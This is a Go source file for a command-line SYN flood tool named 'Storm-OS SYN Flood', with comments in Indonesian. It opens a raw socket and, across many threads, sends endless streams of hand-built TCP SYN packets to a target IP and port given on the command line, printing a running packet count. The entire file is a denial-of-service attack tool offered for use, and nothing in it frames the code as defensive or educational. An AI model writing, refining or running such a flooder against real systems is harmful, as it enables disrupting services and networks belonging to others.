package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"sync/atomic"
	"syscall"
	"time"
)

var count uint64

func main() {
	targetIP := flag.String("t", "", "Target IP")
	port := flag.Int("p", 80, "Target Port")
	threads := flag.Int("w", 10, "Threads")
	flag.Parse()

	if *targetIP == "" {
		fmt.Println("Usage: sudo ./syn_flooder -t <IP> -p <PORT> -w <THREADS>")
		return
	}

	// Gunakan AF_INET dan SOCK_RAW dengan IPPROTO_TCP
	// Di linux, ini adalah standar untuk bypass TCP stack
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Printf("[-] ERROR: RUN SUDO! (%v)\n", err)
		os.Exit(1)
	}

	addr := syscall.SockaddrInet4{Port: *port}
	copy(addr.Addr[:], net.ParseIP(*targetIP).To4())

	fmt.Printf("[!] Storm-OS SYN Flood: %s:%d | Threads: %d\n", *targetIP, *port, *threads)

	// Counter logger
	go func() {
		for {
			fmt.Printf("\r[*] SYN Packets Injected: %d", atomic.LoadUint64(&count))
			time.Sleep(1 * time.Second)
		}
	}()

	for i := 0; i < *threads; i++ {
		go func() {
			for {
				// Membuat header TCP minimalis (20 bytes)
				packet := make([]byte, 20)

				// Source Port (Random 1024-65535)
				srcPort := uint16(time.Now().UnixNano()%64511 + 1024)
				packet[0], packet[1] = byte(srcPort>>8), byte(srcPort&0xff)

				// Destination Port
				packet[2], packet[3] = byte(*port>>8), byte(*port&0xff)

				// Sequence Number (Random)
				packet[4], packet[5], packet[6], packet[7] = 0x01, 0x02, 0x03, 0x04

				// Data Offset (5 words = 20 bytes) & Flags (SYN = 0x02)
				packet[12] = 0x50
				packet[13] = 0x02

				// Window Size
				packet[14], packet[15] = 0x72, 0x10

				// Kirim paket mentah
				err := syscall.Sendto(fd, packet, 0, &addr)
				if err == nil {
					atomic.AddUint64(&count, 1)
				}
			}
		}()
	}

	select {}
}
